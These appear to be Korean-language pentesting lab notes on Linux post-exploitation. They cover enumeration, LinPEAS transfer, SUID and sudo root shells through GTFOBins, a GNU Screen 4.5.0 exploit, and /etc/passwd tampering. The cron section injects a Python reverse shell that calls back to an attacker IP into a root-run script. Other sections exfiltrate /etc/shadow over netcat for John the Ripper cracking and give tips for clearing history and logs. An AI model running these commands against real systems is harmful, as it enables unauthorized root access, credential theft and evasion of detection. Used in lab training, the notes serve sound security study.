# 🔥 후속 공격 (Post-Exploitation) 종류

## 📌 개요

- **추가 정보 수집**  
  목적: 내부망 이동(Lateral Movement)을 위한 계정 정보 확보

- **권한 상승**  
  목적: 루트 또는 로컬 관리자 권한 획득 → 시스템 장악 후 계정, 데이터, 서비스 통제 가능

- **네트워크 피벗**  
  목적: 내부망으로 이동하거나 분리된 망(망 분리 환경)에 접근


# 🔥 추가 정보 수집 시 사용하는 명령어

## ✅ 나는 누구인가?

| 목적                       | 명령어 |
|----------------------------|--------|
| 현재 사용자 확인            | `whoami`, `id`, `groups` |
| sudo 권한 여부 확인        | `sudo -l` → 예: `NOPASSWD: /usr/bin/vim` |
| 홈 디렉토리 확인           | `echo $HOME`, `ls -la ~` |
| 다른 유저 확인             | `cat /etc/passwd`, `cat /etc/group`, `getent group sudo`, `groups <유저>` |
| SSH 키 및 dot 파일 확인    | `ls -alh /home/<user>`, `ls -alh /home/<user>/.ssh` |

> 🎯 **팁**  
> `cat /etc/passwd`에서 UID 1000 이상 사용자는 일반 사용자일 가능성 큼 → 타겟 우선

---

## ✅ 나는 어떤 환경에 있는가?

| 목적                       | 명령어 |
|----------------------------|--------|
| 셸/환경 변수 확인           | `echo $SHELL`, `echo $PATH`, `env`, `export` |
| 도커/쿠버네티스 여부 확인  | `cat /proc/self/cgroup`, `ls -alh /.dockerenv`, `cat /etc/passwd` |

> 목적: 감옥 셸(Jail Shell) 또는 컨테이너 환경 여부 판단

---

## ✅ 나는 어디에 있는가?

| 목적         | 명령어 |
|--------------|--------|
| 호스트 이름       | `hostname`, `uname -a` |
| OS/버전          | `cat /etc/os-release`, `lsb_release -a` |
| IP 주소          | `ip a`, `ifconfig`, `netstat -ano` |
| 게이트웨이 & 경로 | `ip route`, `route -n` |
| ARP 테이블 확인   | `arp -a` |

---

## ✅ 어떤 시스템이 있는가?

> 목적: 실행 중인 서비스, 프로세스, 설치된 소프트웨어 등을 기반으로 취약점 탐색 및 익스플로잇 가능성 분석

| 목적             | 명령어                                                                 |
|------------------|------------------------------------------------------------------------|
| 실행 중인 프로세스   | `ps faux`                                                               |
| 실행 중인 서비스    | `systemctl --type=service --state=running`                             |
| 열린 포트 및 세션   | `ss -ltnp`, `netstat -ltnpua`                                          |
| 설치된 소프트웨어 확인 | `dpkg --list`, `ls -alh /opt`                                        |
| 파일 탐색          | `ls -la /home`, `find / -type f -name "*pass*"`                        |
| 설정 파일 찾기      | `find /etc -name "*.conf" 2>/dev/null`                                 |
| 로그 파일 찾기      | `find /var/log -name "*.log" 2>/dev/null`                              |
| 777 권한 파일 찾기   | `find / -type f -perm 0777 2>/dev/null`                                |
| SUID 권한 파일 찾기 | `find / -type f -perm -4000 2>/dev/null`                               |
| 백도어 확인        | `crontab -l`, `ls /etc/cron*`                                          |

---

## ✅ 나는 어떤 권한을 갖고 있는가?

| 목적             | 명령어 |
|------------------|--------|
| 쓰기/실행 권한 확인 | `ls -l`, `getfacl <file>` |
| 권한 상승 가능성 탐색 | `sudo -l`, `linpeas.sh`, GTFOBins 활용 |

---

## 🚀 LinPEAS를 이용한 정보 수집 자동화

> 목적: 위의 명령어 요소들을 **자동화된 방식으로 빠르게 수집**하기 위해 사용

### 🔧 준비 사항

- 메모리상에서 스크립트를 직접 실행 (배포 불필요)
- 대상 시스템이 인터넷에 연결되어 있어야 함

### 🧪 실습 절차

1. **칼리에서 LinPEAS 다운로드**(curl 또는 wget 사용)
   `curl -L https://github.com/carlospolop/PEASS-ng/releases/latest/download/linpeas.sh > linpeas.sh`
  
2. **칼리에서 타겟으로 linpeas.sh 전송**
	주요 linpeas.sh(파일) 전송 방법
	| 방법       | 설명                                  |
	| -------- | ----------------------------------- |
	| **FTP**  | `put <파일>`                          |
	| **SSH**  | `scp <파일> <유저>@<호스트>`               |
	| **SMB**  | `smbclient` 이용 → `put <파일>`         |
	| **HTTP** | Kali에서 웹 서버 실행: `python3 -m http.server 8000` |
	             타겟에서 다운로드 : `wget http://<Kali IP>:8000/linpeas.sh` |

    예시. `scp linpeas.sh low@172.31.151.214:/home/low/`


3. **타겟에서 스크립트 실행 및 스크립트 결과 저장하기**
	`chmod +x linpeas.sh && ./linpeas.sh > linpeas_result.txt`



> 🎯 **정보수집 팁**
>
> | 상황                             | 전략                                                  |
> | -------------------------------- | ----------------------------------------------------- |
> | 너무 시끄러운 명령 (예: `nmap -A`) 사용 시 | `-T2` 옵션으로 속도 조절 또는 ARP 탐색 선호           |
> | 히스토리/로그 남기고 싶지 않을 때            | `unset HISTFILE`, `history -c`, `/var/log` 수동 삭제 주의 |
> | 자동 정보 수집                       | `LinEnum.sh`, `linpeas.sh`, `pspy` 사용               |

---

# 🔥 권한 상승 
- 목적: 루트 또는 로컬 관리자 권한 획득 → 시스템 장악 후 계정, 데이터, 서비스 통제 가능
---
# 🛡️ 실습 – 파일 권한 SUID 파일
리눅스 SUID 권한 상승: find 바이너리로 root 쉘 얻기
## 1. SUID란 무엇인가?
- **SUID(Set User ID)**는 리눅스/유닉스에서  
  "이 파일을 실행하는 사용자가 누구든, 실행할 때만큼은 파일 '소유자'의 권한으로 실행해준다"는 특별한 권한입니다.
- 보통 실행 파일에 SUID가 걸려 있고, 소유자가 root라면  
  일반 사용자도 그 파일을 실행할 때만 root 권한을 '빌려서' 쓸 수 있습니다.
---
## 2. SUID 바이너리 찾기
- 시스템 전체에서 SUID가 걸린 실행 파일(바이너리) 찾기 명령어:
    ```
    find / -type f -perm -4000 2>/dev/null
    ```
- 예시 출력:
    ```
    /usr/bin/find
    ```  
- `ls -alh /usr/bin/find`
  - 권한이 `-rwsr-xr-x`처럼 **'s'**(소문자 s)가 있으면 SUID가 설정됨
    - `s`는 실행 권한과 SUID가 모두 있는 상태를 의미
---
## 3. SUID가 걸린 find로 root 권한 얻기 (GTFOBins 활용)

### 실제 공격 예시
1. **GTFOBins**(https://gtfobins.github.io/) 에서 find를 검색
2. 위에서 검색 후 참고한 아래 명령어를 실행:
    ```
    find . -exec /bin/bash -ip \;

    ```
    - 현재 디렉토리에서 아무 파일이나 찾고, 그 즉시 `/bin/bash`를 실행합니다.
	- `find`가 root 권한이므로 `bash`도 root 권한으로 실행됩니다.
	- `-i` 옵션: bash를 인터랙티브 모드로 실행  
    - `-p` 옵션: bash가 SUID 권한을 보존하도록 실행

3. 쉘이 열리면 확인:
    ```
    whoami
    ```
    - 출력:  
      ```
      root
      ```
    - 즉, **root 권한의 셸** 획득
---
# 하드코딩된 계정 정보를 사용하여 권한 상승

## 주요 발견되는 곳

- **소스 코드**
- **설정 파일** (`/etc/*.conf`)에 하드코딩된 계정 정보  
  - 예: `grep -ri password /etc/*.conf`
- **특정 소프트웨어 설정 파일**  
  - 예: 웹서버 `/var/www/html/config.php`에 하드코딩된 계정 정보
  - 예: DB 관련 계정 정보 `cd /var/www/html; grep -ri DB_* > ~/dbinfo.txt`
   - 추출된 db 계정 정보를 이용하여 ssh 접근 가능
- **환경 변수**
---
# 소프트웨어 취약점 이용

## 1. dpkg 살펴보기

- 시스템에 설치된 패키지(소프트웨어) 목록을 확인하고, 버전 정보를 파악한다.

## 2. 디렉토리 살펴보기

- `/app`  
  - 도커(Docker), 쿠버네티스(Kubernetes) 등에서 첫 번째로 찾는 소프트웨어 디렉터리 중 하나

- `/opt`  
  - "옵션" 소프트웨어 패키지 디렉터리  
  - 타사, 추가적인 소프트웨어 설치 디렉터리
  - 예시:  
    ```
    ls -alh /opt/
    drwxr-xr-x  7 ubuntu users 4.0K Sep 13  2023 screen-4.5.0
    ```
    **타겟에서 screen-4.5.0 사용 확인**

## 3. 취약점 데이터베이스 검색

- **CVE 검색**  
  - Common Vulnerabilities and Exposures(공통 취약점 및 노출) 번호로 취약점 정보 검색

- **exploit-db 데이터베이스 검색**  
  - exploit-db(익스플로잇 데이터베이스)에서 공개된 공격 코드 및 취약점 정보 검색
  
- **칼리에서 screen-4.5.0 공개 취약점 검색**
    ```
    searchsploit screen 4.5.0
    ------------------------------------------------- ---------------------------------
     Exploit Title                                   |  Path
    ------------------------------------------------- ---------------------------------
    GNU Screen 4.5.0 - Local Privilege Escalation    | linux/local/41154.sh
    ```

- PoC 코드 다운로드
    `searchsploit -m 41154.sh`
	해당 sh 파일을 타겟으로 파일 전송한 뒤,
    `chmod +x 41154.sh; ./41154.sh`
    실행 시  root 권한 획득 가능
---
# 🛡️ SUDO 권한 상승 (GTFOBins 활용)
- **sudo란?**
  - 리눅스/유닉스 시스템에서 일반 사용자가 특정 명령어를 루트(root) 또는 다른 사용자 권한으로 실행할 수 있도록 해주는 명령어
  - 시스템 관리, 설정 변경 등 고권한 작업에 사용됨

- **권한 상승(Privilege Escalation)이란?**
  - 제한된 권한의 사용자가 시스템의 더 높은 권한(예: root)을 획득하는 공격 기법
  - sudo 설정이 잘못되어 있으면 악용 가능
## 실제 공격 예시 
1. sudo 권한 확인
-  `sudo -l`
   - 출력 예시:
   - (ALL) NOPASSWD: /usr/bin/vim
   - **NOPASSWD**: 비밀번호 입력 없이 실행 가능
   - **(ALL)**: 모든 사용자로 실행 가능
   - **/usr/bin/vim**: vim 명령어만 sudo로 실행 가능
   - 현재 타겟에서 vim 편집기를 비밀번호 입력 없이 실행 가능 확인
2. **GTFOBins**(https://gtfobins.github.io/) 에서 vim를 검색
3. 위에서 검색 후 참고한 아래 명령어를 실행:
    ```
    sudo vim -c ':!/bin/sh'

    ```
	- vim은 기본적으로 자신을 실행한 사용자의 권한으로 동작
	- `sudo` 를 같이 사용하여 	vim 자체가 root 권한으로 실행됨 → 내부에서 실행되는 셸(bin/bash)도 root 권한으로 실행됨
	- `-c` 옵션은 vim 실행 후 곧바로 명령어를 실행하게 해주는 옵션
	- :! 는 vim에서 외부 명령어를 실행할 수 있게 해주는 명령어
	
4. 쉘이 열리면 확인:
    ```
    whoami
    ```
    - 출력:  
      ```
      root
      ```
    - 즉, **root 권한의 셸** 획득
---
# 🛡️ Cron (작업 스케줄러)을 이용한 권한 상승
**cron이란?**
- 특정 시간이나 요일에 자동으로 실행되는 작업을 예약하는 데 사용
- 각 유저는 자신의 crontab 작업을 설정할 수 있고,  
  시스템 전반적으로는 `/etc/cron.d/` 및 `/etc/cron.*` 디렉토리에 위치한 파일들을 통해 관리
---
## 공격 순서

1. **현 유저 cron 확인**
    ```
    crontab -l
    ```
- 일반 사용자로 `cron -l`을 실행하면 다음과 같은 오류가 발생
  - cron: can't open or create /var/run/crond.pid: Permission denied
  - 이는 **cron 관련 파일과 디렉터리의 권한이 root:root로 설정**되어 있어  
    일반 사용자는 크론 작업을 직접 등록하거나 실행할 수 없기 때문임. crontab 파일, pid 파일, spool 디렉터리 등은 모두 root 권한이 필요하며,  
    일반 사용자는 자신의 crontab만 수정할 수 있음
  - 따라서, 현 유저로는 스케쥴러를 직접 등록이 불가하여 시스템이 실행하는 스케쥴러을 이용하여 권한 상승 진행

2. **시스템 전반적 cron 확인**
    `ls -alhR /etc/cron*`
    - 출력:  
      ```
      /etc/cron.d:
	 -rw-r--r-- 1 root root 57 Sep 13 2023 backup
      ```
    - `/etc/cron.d/backup` 스케줄러가 있는 것을 확인 	
	
    `cd /etc/cron.d/; cat backup`	
    - 출력:  
      ```
      */1 * * * * root /usr/bin/python3 /tmp/onetime-backup.py
      ```
    - 해석: **매 1분마다**, root 권한으로 `/usr/bin/python3 /tmp/onetime-backup.py` 실행
	- ⚠️ 즉, /tmp/onetime-backup.py 파일에 악성 코드를 넣으면, 매 1분마다 root 권한으로 실행됨!
	  
3. **악성 코드(리버스 쉘) 작성 및 삽입**
① 리버스 쉘 코드 준비 (공격자 측)
 - https://www.revshells.com/ 에서 파이썬 리버스 쉘 참고 : 
 ``` 
 import sys,socket,os,pty;s=socket.socket();s.connect(('공격자IP',9001));[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('sh')
 ```
② 리스너 대기 (공격자 측)
 ```
 nc -lvnp 9001
 ```

③ 타겟 머신에서 악성 스크립트 삽입 - ⚠️주의.echo 사용 시 큰따옴표(") 안에는 작은따옴표(')를 써야함
```
echo "import sys,socket,os,pty;s=socket.socket();s.connect(('10.8.1.37',9001));
[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn('sh')" > /tmp/onetime-backup.py
```

4. **1분 대기 후 크론 잡 실행 → 리버스 쉘 연결됨**
    ```
    whoami
    ```
    - 출력:  
      ```
      root
      ```
    - 즉, **root 권한의 셸** 획득

---
# 🛡️ /etc/passwd 이용한 권한 상승


**취약/정상 /etc/passwd** 
`cat /etc/passwd`: -rw-rw-rw- 1 root shadow(666) - ❗️취약: 모든 사용자가 읽고 쓸 수 있음
`cat /etc/passwd`: -rw-r--r-- 1 root shadow(644) - ✅ 정상: 모든 사용자가 읽을 수 있으나 root만 쓸 수 있음
-> 일반 사용자도 /etc/passwd 를 수정할 수 있으므로, 계정 정보를 변경하여 권한 상승이 가능함.

📌 **/etc/passwd 파일을 수정하여 권한 상승하는 법**
- 기존 low 계정의 라인
 - low:x:1001:1001::/low:/bin/bash
- 수정된 라인 (root UID, GID로 변경)
 - low:x:0:0:root:/root:/bin/bash
➡ 재로그인하면, low 계정이 UID 0, GID 0 (root 권한)을 가지므로, root 쉘을 획득


# 🛡️ /etc/passwd&shadow 이용한 계정 탈취
**취약/정상 /etc/shadow**
/etc/shadow: -rw-rw-r-- 1 root shadow(664) - ❗️취약: 누구나 읽을 수 있음, root와 shadow 그룹만 쓸 수 있음
/etc/shadow: -rw-r----- 1 root shadow(640) - ✅ 정상: root와 shadow 그룹만 읽을 수 있고, root만 쓸 수 있음
-> shadow 파일이 읽을 수 있다면, 암호 해시 탈취 및 크래킹 가능.

**🔍 shadow 파일의 구조 및 분석**
예시)
-> root:$6$sqaU2Vb2$KTYPtEjmcGIqgnzHA84rRr1O4/rdp.9BwJKTjhd.TxNzEsiEXb0YhCRNZMVw.CgXi98PnKhzlW00QDHJhDE9o0:19613:0:99999:7:::

여기서 $로 구분된 첫 번째 숫자가 암호화 알고리즘을 의미합니다.

| 식별자    | 알고리즘                      |
| ------ | ------------------------- |
| `$1$`  | MD5-crypt                 |
| `$2a$` | Blowfish                  |
| `$5$`  | SHA-256                   |
| `$6$`  | SHA-512 (보통 root 계정에 사용됨) |
따라서 현재 root 계정은 SHA-512 알고리즘으로 암호화 중임을 확인


**📦 /etc/shadow 비밀번호 크랙**
1. 타겟(실습 박스)에서 실행:
## shadow 파일 내보내기
$ `nc -lnvp 9999 < /etc/shadow`
## passwd 파일 내보내기
$ `nc -lnvp 9998 < /etc/passwd`

2. 공격자 박스(칼리)에서 실행:
## shadow 파일 받기
$ `sudo nc <타겟 IP> 9999 > ~/Downloads/shadow.txt`
## passwd 파일 받기
$ `sudo nc <타겟 IP> 9998 > ~/Downloads/passwd.txt`

3. shadow와 passwd 병합 및 크랙:
➡ John the Ripper 같은 크래킹 툴은 단순히 암호 해시만 있어서는 누구에 대한 해시인지 알 수 없음.
   즉, shadow.txt에는 사용자 이름은 있지만, UID나 홈 디렉토리 정보는 없음.
	✅ /etc/passwd 와 /etc/shadow 를 합쳐야 사용자 계정과 그에 해당하는 암호 해시 정보를 매핑할 수 있고,
	✅ John the Ripper는 이 매핑된 형식을 통해 어떤 계정의 암호를 크랙하는지 파악 가능함.
## unshadow 명령어로 두 파일을 병합
$ unshadow passwd.txt shadow.txt > combined.txt
## John the Ripper로 암호 크랙 시도
$ sudo gzip -d /usr/share/wordlists/rockyou.txt.gz
$ john --wordlist=/usr/share/wordlists/rockyou.txt combined.txt


